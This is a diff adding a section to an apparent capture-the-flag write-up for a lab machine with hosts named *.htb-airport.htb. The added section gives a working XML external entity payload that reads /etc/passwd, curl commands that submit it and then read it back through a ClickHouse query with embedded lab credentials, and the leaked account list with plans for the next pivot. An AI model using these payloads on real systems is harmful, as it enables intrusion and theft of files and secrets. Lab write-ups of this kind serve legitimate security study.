@@ -849,6 +849,73 @@ airline:        PROBE
 Key finding: the value placed in `<Airline>` arrives in the `airline` column keyed by our `transaction_id`. The downstream parser processes attacker-supplied content and the result is queryable, so an external entity placed in that element will have its expansion written where it can be read back.
 <div align="center">
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+#### 3.1.2 Read arbitrary files with an external entity
+
+Add a `DOCTYPE` that declares an external entity pointing at a file, and reference that entity inside `<Airline>`. If the parser resolves it, the file contents are written to the `airline` column under the chosen id. Start with `/etc/passwd` to enumerate accounts.
+
+**Command:**
+
+```bash
+cat > xxe.xml <<'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<IATA_AIDX_FlightLegNotifRQ xmlns="http://www.iata.org/IATA/2007/00" Version="22.1"
+  TimeStamp="2026-10-17T12:10:00Z" TransactionIdentifier="xxe-01">
+  <Originator><CompanyShortName>TST</CompanyShortName><Code>TS</Code></Originator>
+  <FlightLeg>
+    <LegIdentifier>
+      <Airline CodeContext="3">&xxe;</Airline>
+      <FlightNumber>999</FlightNumber>
+      <DepartureAirport CodeContext="3">XXX</DepartureAirport>
+      <ArrivalAirport CodeContext="3">YYY</ArrivalAirport>
+      <OriginDate>2026-10-17</OriginDate>
+      <RepeatNumber>1</RepeatNumber>
+    </LegIdentifier>
+  </FlightLeg>
+</IATA_AIDX_FlightLegNotifRQ>
+EOF
+
+curl -s -X POST http://api.htb-airport.htb:8081/feeds/aidx -H 'Content-Type: application/xml' --data-binary @xxe.xml; echo
+
+sleep 6
+curl -sG http://db.htb-airport.htb/ -u 'svc_events:Yl4aCgh4y2PnU' --data-urlencode "query=SELECT airline FROM partner_feed.flightleg_json WHERE transaction_id='xxe-01' FORMAT RawBLOB"
+```
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `<!DOCTYPE ... [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` | Declare the entity | Defines an external entity `xxe` whose value is the contents of a file on the server. |
+| `<Airline ...>&xxe;</Airline>` | Trigger expansion | References the entity where a parsed value is expected, so its expansion is stored in the `airline` column. |
+| `TransactionIdentifier="xxe-01"` | Tag the submission | A fresh id so the result can be queried back cleanly. |
+| `curl -X POST ... --data-binary @xxe.xml` | Submit | Sends the malicious document to the ingest endpoint. |
+| `... WHERE transaction_id='xxe-01' FORMAT RawBLOB` | Read back | Pulls the `airline` column verbatim so a multi-line file prints intact. |
+
+**Result:**
+
+```shell
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+_laurel:x:999:988::/var/log/laurel:/bin/false
+svc-infra:x:1000:1000:,,,:/home/svc-infra:/bin/bash
+clickhouse:x:996:987::/nonexistent:/bin/false
+martin_cole:x:1001:1001:,,,:/home/martin_cole:/bin/bash
+dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
+```
+
+Key finding: the parser resolves external entities, giving arbitrary file read exfiltrated through ClickHouse. Accounts with real login shells are `root`, `svc-infra` (uid 1000), and `martin_cole` (uid 1001); a `clickhouse` service account and the `_laurel` audit logger are also present. `svc-infra` is the first pivot target, so the next files to read are its service configuration for reusable secrets.
+
+<div align="center">
+<br>
 <br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
